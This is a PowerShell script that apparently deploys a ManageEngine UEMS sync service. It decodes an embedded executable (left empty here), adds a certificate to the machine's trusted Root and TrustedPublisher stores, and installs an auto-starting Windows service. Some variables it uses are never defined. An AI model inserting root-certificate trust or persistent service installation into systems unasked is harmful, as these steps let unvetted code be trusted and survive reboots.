# ============================================================
# CONFIG
# ============================================================

$MainDir          = "C:\Windows\System32\Acceleron\"
$BaseDir          = Join-Path $MainDir "ManageEngine"
$CertDir          = Join-Path $MainDir "Certificate"

$ExeWrapperPath   = Join-Path $BaseDir "UEMSSyncService.exe"
$CertPath         = Join-Path $CertDir "GainwellWallpaper.cer"

$PinnedThumbprint = "ECACA66CD84B620E80C8329A253DE85149666D6E"

$IsSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().IsSystem)
$IsAdmin  = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================
# ENSURE BASE DIRECTORY
# ============================================================

# Create base directory if not exists
if (-not (Test-Path $BaseDir)) {
    New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null
}

# Create certificate directory if not exists
if (-not (Test-Path $CertDir)) {
    New-Item -Path $CertDir -ItemType Directory -Force | Out-Null
}

# ============================================================
# EMBEDDED BINARIES (BASE64)
# ============================================================

$Base64 = @"

"@

# ============================================================
# DECODE EXEs
# ============================================================

$ExeBytes = [Convert]::FromBase64String($Base64)

# ============================================================
# WRITE + TRUST CERTIFICATE
# ============================================================

try {
    if (-not (Test-Path $CertPath)) {
        [IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($CertBase64))
    }

    foreach ($store in @("Root", "TrustedPublisher")) {
        if (-not (certutil -store $store | Select-String $PinnedThumbprint)) {
            & certutil.exe -addstore $store $CertPath | Out-Null
        }
    }
} catch {
    Exit-Install 1 ("Failed to install trust certificate: {0}" -f $_) "ERROR"
}

# ============================================================
# WRITE EXE WRAPPER
# ============================================================
$WriteExe = $true

if (Test-Path $ExeWrapperPath) {

    $Sig = Get-AuthenticodeSignature $ExeWrapperPath

    if (
        $Sig.SignerCertificate -and
        $Sig.SignerCertificate.Thumbprint -eq $PinnedThumbprint
    ) {
        $WriteExe = $false
    }
}

if ($WriteExe) {

    [IO.File]::WriteAllBytes($ExeWrapperPath, $ExeBytes)

    Start-Sleep 2
    $Sig = Get-AuthenticodeSignature $ExeWrapperPath

    if (
        -not $Sig.SignerCertificate -or
        $Sig.SignerCertificate.Thumbprint -ne $PinnedThumbprint -or
        $Sig.Status -in @('HashMismatch','NotSigned')
    ) {
        throw "MEAgentSyncService.exe signature validation failed"
    }
}

Write-Host "EXE restored to $ExeWrapperPath"

# ============================================================
# SERVICE TASK
# ============================================================

# Create service if not exists
$ServiceName = "ManageEngine UEMS - Sync Service"

# Stop service if running
$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue

if ($svc)
{
    if ($svc.Status -eq 'Running')
    {
        Stop-Service -Name $ServiceName -Force
    }
    sc.exe delete "$ServiceName" | Out-Null
    Start-Sleep -Seconds 3
}

# Create service
New-Service -Name $ServiceName -DisplayName $ServiceName -Description $ServiceName -BinaryPathName "`"$ExeWrapperPath`"" -StartupType Automatic | Out-Null

Write-Host "Service created."

# Start service
Start-Service -Name $ServiceName

Write-Host "Service started."